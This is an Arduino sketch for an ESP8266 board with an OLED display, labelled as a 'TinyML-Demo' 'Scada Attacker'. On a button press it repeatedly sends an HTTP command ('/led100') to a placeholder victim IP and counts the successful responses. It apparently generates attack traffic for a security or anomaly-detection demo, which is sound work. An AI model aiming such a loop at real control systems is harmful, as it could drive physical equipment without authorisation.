#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include "SSD1306.h"

extern "C" {
#include "user_interface.h"
}

int buttonApin = 14;  //D5
const char* ssid = "<ssid>";
const char* password = "<password>";
const char* host = "<victim ip>";
const uint16_t port = 80;
String url = "/led100";

/* create display(Adr, SDA-pin, SCL-pin) */
SSD1306 display(0x3c, 5, 4);   // GPIO 5 = D1, GPIO 4 = D2

#define flipDisplay true
/* Display settings */
#define minRow       0              /* default =   0 */
#define maxRow     127              /* default = 127 */
#define minLine      0              /* default =   0 */
#define maxLine     63              /* default =  63 */

/* render settings */
#define Row1         0
#define Row2        30
#define Row3        35
#define Row4        80
#define Row5        85
#define Row6       125

#define LineText     0
#define Line        12
#define LineVal     47

void setup() {

  pinMode(buttonApin, INPUT_PULLUP);

  /* start Display */
  display.init();
  if (flipDisplay) display.flipScreenVertically();

  /* show start screen */
  display.clear();
  display.setFont(ArialMT_Plain_16);
  display.drawString(0, 0, "TinyML-");
  display.drawString(0, 16, "Demo");
  display.setFont(ArialMT_Plain_10);
  display.drawString(0, 40, "Version 1.1");
  display.drawString(0, 50, "Scada Attacker");
  display.display();
  delay(2500);
  display.clear();

  WiFi.begin(ssid, password);

  display.drawString(0, 0, "Connecting ...");
  display.display();
  int i = 0;
  while (WiFi.status() != WL_CONNECTED) { // Wait for the Wi-Fi to connect: scan for Wi-Fi networks, and connect to the strongest of the networks above
    delay(250);
  }
  display.clear();
  display.drawString(0, 10, "Connected");
  display.drawString(0, 20, "SSID:");
  display.drawString(32, 20, (String)WiFi.SSID());
  display.drawString(0, 30, "IP:");
  display.drawString(32, 30, WiFi.localIP().toString());
  display.display();
  delay(10000);
  display.clear();
  display.display();

}

void attack(){
  int count = 0;
  do {
    display.clear();
    display.drawString(0, 0, "Attacking");
    display.drawString(0, 10, (String)host);
    display.drawString(0, 20, "Sent Count:");
    display.display();
  
    // Use WiFiClient class to create TCP connections
    WiFiClient client;
    if (!client.connect(host, port)) {
      display.drawString(0, 40, "Connection failed");
      display.display();
      delay(5000);
      display.clear();
      return;
    }

    if (client.connected()) {
      // This will send the request to the server
      client.print(String("GET ") + url + " HTTP/1.1\r\n" +
                  "Host: " + host + "\r\n" + 
                  "Connection: close\r\n\r\n");
      delay(500);
    }

    // wait for data to be available
    unsigned long timeout = millis();
    while (client.available() == 0) {
      if (millis() - timeout > 5000) {
        client.stop();
        delay(5000);
        return;
      }
    }

    while (client.available()) {
      String line = client.readStringUntil('\r');
      if (line == "HTTP/1.1 200 OK") {
        count++;
        display.drawString(0, 30, (String)count);
        display.display();
        delay(500);
        break;
      } else {
        break;
      }
    }

    // Close the connection
    client.stop();
    delay(1000);
    } while (count < 90);
    
    display.drawString(0, 40, "Attack completed");
    display.clear();
    delay(5000);
    display.display();
}

void loop() {
  if (digitalRead(buttonApin) == LOW) {
    attack();
  }
}
